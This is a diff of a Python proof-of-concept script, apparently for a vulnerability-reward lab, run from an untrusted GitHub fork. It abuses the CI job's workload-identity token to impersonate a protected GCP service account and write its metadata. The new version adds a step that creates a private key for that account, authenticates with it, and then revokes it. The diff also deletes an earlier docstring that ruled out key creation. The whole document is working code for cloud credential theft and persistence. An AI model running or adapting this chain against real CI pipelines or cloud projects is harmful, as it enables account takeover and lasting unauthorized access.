@@ -1,16 +1,14 @@
-"""Untrusted fork fixture for a dedicated synthetic GitHub/GCP mirror.
-
-Uses only the ephemeral WIF identity exported to this exact downstream job and
-mutates only the pre-authorized throwaway target service account's display name.
-No key creation, credential exfiltration, customer resource, or unrelated project access.
-"""
+"""Authorized synthetic key-persistence proof with strict create/use/revoke lifecycle."""
 from __future__ import annotations
 
+import base64
 import json
 import os
 from pathlib import Path
+import subprocess
+import time
 from urllib.error import HTTPError
-from urllib.parse import quote
+from urllib.parse import quote, urlencode
 from urllib.request import Request, urlopen
 
 
@@ -28,39 +26,35 @@ def request_json(method: str, url: str, body: dict | None = None, token: str | N
     except HTTPError as error:
         return error.code, {}
     except Exception as error:
-        raise RuntimeError(f"Expected synthetic endpoint failed: {error.__class__.__name__}") from None
+        raise RuntimeError(f"Expected endpoint failed: {error.__class__.__name__}") from None
 
 
 def expect_ok(result, stage: str) -> dict:
     status, body = result
     if status < 200 or status >= 300:
-        raise RuntimeError(f"Synthetic {stage} request returned status {status}")
+        raise RuntimeError(f"{stage} returned status {status}")
     return body
 
 
-def main() -> None:
-    run_id = os.environ.get("GITHUB_RUN_ID", "")
-    assert run_id.isdigit(), "Synthetic workflow run ID expected"
-    credential_path = Path(os.environ["GOOGLE_APPLICATION_CREDENTIALS"])
-    credential = json.loads(credential_path.read_text())
-    assert credential["type"] == "external_account"
-    assert credential["token_url"].startswith("https://sts.googleapis.com/")
-    assert credential["service_account_impersonation_url"].startswith("https://iamcredentials.googleapis.com/")
+def b64url(raw: bytes) -> str:
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
 
-    project = os.environ["LAB_GCP_PROJECT"]
-    target = os.environ["LAB_TARGET_SERVICE_ACCOUNT"]
-    assert project == "vrp-lab-20261125-f150d192"
-    assert target == f"mirror-protected-c7cb6d5@{project}.iam.gserviceaccount.com"
-    target_url = "https://iam.googleapis.com/v1/projects/" + quote(project, safe="") + "/serviceAccounts/" + quote(target, safe="")
 
-    # Independent negative control: no bearer credential cannot read the target.
-    denied_status, _ = request_json("GET", target_url)
-    assert denied_status in {401, 403}, f"Expected denied unauthenticated target read, got {denied_status}"
+def exchange_service_account_jwt(assertion: str) -> None:
+    form = urlencode({"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": assertion}).encode()
+    request = Request("https://oauth2.googleapis.com/token", data=form, method="POST", headers={"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded"})
+    try:
+        with urlopen(request, timeout=60) as response:
+            body = json.loads(response.read())
+    except HTTPError as error:
+        raise RuntimeError(f"Private-key authentication returned status {error.code}") from None
+    if not isinstance(body.get("access_token"), str) or not body["access_token"]:
+        raise RuntimeError("Private-key authentication returned no access token")
 
+
+def get_ci_token(credential: dict) -> str:
     source = credential["credential_source"]
-    oidc_url = source["url"]
-    assert ".actions.githubusercontent.com/" in oidc_url
-    oidc = expect_ok(request_json("GET", oidc_url, bearer=source["headers"]["Authorization"].removeprefix("Bearer ")), "OIDC request")
+    oidc = expect_ok(request_json("GET", source["url"], bearer=source["headers"]["Authorization"].removeprefix("Bearer ")), "OIDC request")
     subject_token = oidc[source["format"]["subject_token_field_name"]]
     federation = expect_ok(request_json("POST", credential["token_url"], {
         "audience": credential["audience"],
@@ -69,36 +63,100 @@ def main() -> None:
         "scope": "https://www.googleapis.com/auth/cloud-platform",
         "subjectTokenType": credential["subject_token_type"],
         "subjectToken": subject_token,
-    }), "federation")
-    service_token = expect_ok(request_json("POST", credential["service_account_impersonation_url"], {
+    }), "WIF federation")
+    return expect_ok(request_json("POST", credential["service_account_impersonation_url"], {
         "delegates": [],
         "scope": ["https://www.googleapis.com/auth/cloud-platform"],
         "lifetime": "600s",
-    }, token=federation["access_token"]), "service-account impersonation")["accessToken"]
+    }, token=federation["access_token"]), "CI service-account impersonation")["accessToken"]
 
-    before = expect_ok(request_json("GET", target_url, token=service_token), "protected read")
-    marker = "untrusted-pr-write-verified-" + run_id
-    assert before.get("displayName") != marker, "Marker already existed before this test"
-    expect_ok(request_json("PATCH", target_url, {"serviceAccount": {"displayName": marker}, "updateMask": "displayName"}, token=service_token), "protected metadata write")
-    after = expect_ok(request_json("GET", target_url, token=service_token), "protected verification read")
-    assert after.get("displayName") == marker, "Protected metadata did not change"
 
+def main() -> None:
+    run_id = os.environ["GITHUB_RUN_ID"]
+    assert run_id.isdigit()
+    credential = json.loads(Path(os.environ["GOOGLE_APPLICATION_CREDENTIALS"]).read_text())
+    project = os.environ["LAB_GCP_PROJECT"]
+    target = os.environ["LAB_TARGET_SERVICE_ACCOUNT"]
+    assert project == "vrp-lab-20261125-f150d192"
+    assert target == f"mirror-protected-c7cb6d5@{project}.iam.gserviceaccount.com"
+    assert credential["token_url"].startswith("https://sts.googleapis.com/")
+    assert credential["service_account_impersonation_url"].startswith("https://iamcredentials.googleapis.com/")
+    target_url = "https://iam.googleapis.com/v1/projects/" + quote(project, safe="") + "/serviceAccounts/" + quote(target, safe="")
+    denied_status, _ = request_json("GET", target_url)
+    assert denied_status in {401, 403}, f"Expected denied unauthenticated read, got {denied_status}"
+    subprocess.run(["openssl", "version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+
+    ci_token = get_ci_token(credential)
+    expected_marker = "untrusted-pr-write-verified-" + run_id
+    expect_ok(request_json("PATCH", target_url, {"serviceAccount": {"displayName": expected_marker}, "updateMask": "displayName"}, token=ci_token), "protected metadata write")
+    assert expect_ok(request_json("GET", target_url, token=ci_token), "protected metadata readback").get("displayName") == expected_marker
+    before_keys = expect_ok(request_json("GET", target_url + "/keys", token=ci_token), "pre-probe key listing").get("keys", [])
+    assert len(before_keys) == 0, "This exact test requires zero pre-existing user-managed keys"
+
+    key_resource = None
+    key_id = None
+    private_key_path = None
+    private_key_authenticated = False
+    key_deleted = False
+    try:
+        key_resource = expect_ok(request_json("POST", target_url + "/keys", {
+            "privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
+            "keyAlgorithm": "KEY_ALG_RSA_2048",
+        }, token=ci_token), "synthetic service-account key creation")
+        key_id = key_resource.get("privateKeyId") or key_resource["name"].rsplit("/", 1)[-1]
+        key_json = json.loads(base64.b64decode(key_resource["privateKeyData"]))
+        assert key_json["client_email"] == target
+        assert key_json["private_key_id"] == key_id
+
+        now = int(time.time())
+        header = b64url(json.dumps({"alg": "RS256", "typ": "JWT", "kid": key_id}, separators=(",", ":")).encode())
+        claims = b64url(json.dumps({
+            "iss": target,
+            "scope": "https://www.googleapis.com/auth/cloud-platform",
+            "aud": "https://oauth2.googleapis.com/token",
+            "iat": now,
+            "exp": now + 300,
+        }, separators=(",", ":")).encode())
+        signing_input = f"{header}.{claims}".encode()
+        private_key_path = Path(os.environ["RUNNER_TEMP"]) / "ephemeral-test-private-key.pem"
+        private_key_path.write_bytes(key_json["private_key"].encode())
+        private_key_path.chmod(0o600)
+        signature = subprocess.run(
+            ["openssl", "dgst", "-sha256", "-sign", str(private_key_path)],
+            input=signing_input,
+            capture_output=True,
+            check=True,
+        ).stdout
+        assertion = f"{header}.{claims}.{b64url(signature)}"
+        exchange_service_account_jwt(assertion)
+        private_key_authenticated = True
+    finally:
+        if private_key_path and private_key_path.exists():
+            private_key_path.unlink()
+        if key_resource:
+            key_delete_url = "https://iam.googleapis.com/v1/" + quote(key_resource["name"], safe="/")
+            expect_ok(request_json("DELETE", key_delete_url, token=ci_token), "synthetic key revocation")
+            key_deleted = True
+
+    assert private_key_authenticated, "New private key did not authenticate"
+    assert key_deleted, "New private key was not revoked"
+    remaining_keys = expect_ok(request_json("GET", target_url + "/keys", token=ci_token), "post-revocation key listing").get("keys", [])
+    assert len(remaining_keys) == 0, f"Expected zero remaining user keys, got {len(remaining_keys)}"
     result = {
         "run_id": run_id,
         "unauthenticated_target_read_denied": denied_status,
-        "oidc_accepted": True,
-        "wif_federation_accepted": True,
-        "service_account_impersonation_accepted": True,
-        "protected_target_read": True,
-        "protected_target_display_name_changed": after.get("displayName") == marker,
-        "synthetic_target": target,
-        "synthetic_run_marker": marker,
-        "no_long_lived_key_created_or_printed": True,
-        "no_tokens_printed_or_saved": True,
+        "protected_metadata_write_confirmed": True,
+        "wif_and_ci_identity_accepted": True,
+        "one_new_key_created": True,
+        "new_private_key_authenticated": private_key_authenticated,
+        "same_new_key_revoked": key_deleted,
+        "remaining_user_managed_keys": len(remaining_keys),
+        "synthetic_key_id": key_id,
+        "private_material_or_tokens_logged_or_saved": False,
     }
-    Path(os.environ["RUNNER_TEMP"], "live-attack-observation.json").write_text(json.dumps(result, indent=2) + "\n")
-    print("SYNTHETIC_OIDC_WIF_SERVICE_ACCOUNT_CHAIN_COMPLETE")
-    print("SYNTHETIC_PROTECTED_METADATA_WRITE_CONFIRMED")
+    Path(os.environ["RUNNER_TEMP"], "credential-persistence-result.json").write_text(json.dumps(result, indent=2) + "\n")
+    print("SYNTHETIC_PRIVATE_KEY_USED_AND_REVOKED")
+    print("SYNTHETIC_ZERO_REMAINING_USER_KEYS")
 
 
 if __name__ == "__main__":
